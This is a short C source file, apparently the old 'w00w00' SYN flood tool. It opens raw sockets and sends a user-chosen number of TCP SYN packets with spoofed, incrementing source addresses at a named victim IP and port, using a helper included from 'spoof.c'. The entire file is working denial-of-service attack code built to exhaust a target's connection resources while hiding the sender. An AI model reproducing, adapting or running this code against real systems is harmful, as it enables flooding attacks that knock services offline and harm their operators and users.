/* w00w00! */
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_tcp.h>
#include <netinet/ip_icmp.h>
#include "spoof.c"

#define ERROR -1

unsigned long int host2ip(char *serv)
{
  struct sockaddr_in sinn;
  struct hostent *hent;
      
  if ((hent = gethostbyname(serv)) == NULL) {
	perror("gethostbyname");
	exit(ERROR);
  }

  bzero((char *)&sinn, sizeof(sinn));
  bcopy(hent->h_addr, (char *)&sinn.sin_addr, hent->h_length);

  return sinn.sin_addr.s_addr;
}
 
                     
void main(int argc, char **argv)
{
  int s, s_r;
  int i, loop;

  unsigned long bla;
  unsigned long s_ip, d_ip;

 
  printf("w00w00!\n");
  if (argc < 4) {
 	printf("usage:\n\t%s <source ip> <victim ip> <victim port> "
               "<number of syn packets>\n", argv[0]);
	exit(ERROR);
  }
                    
  if ((s_r = socket(AF_INET,SOCK_RAW, 6)) == ERROR) {
	perror("socket");
	exit(ERROR);
  }
  	
  if ((s = socket(AF_INET, SOCK_RAW, 255)) == ERROR) {
	perror("socket");
	close(s_r);
	exit(ERROR);
  }

  #ifdef IP_HDRINCL
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i)) < 0) {
	perror("setsockopt");
        close(s_r);
        close(s);
        exit(ERROR); 
  }
  #endif           

	 
  s_ip = host2ip(argv[1]);
  d_ip = host2ip(argv[2]);
  loop = atoi(argv[4]);
 
  printf("Sending packets...\n");

  for (i = 0; i < loop; i++) {
      bla  = ntohl(s_ip), bla++;
      s_ip = htonl(bla);
      putchar('.');
 
      send_pkt(s, s_ip, d_ip, 4+i, atoi(argv[3]), TH_SYN, 123, 3, 512,
               NULL, 0);
  }

  printf("\nDone!\n");
}
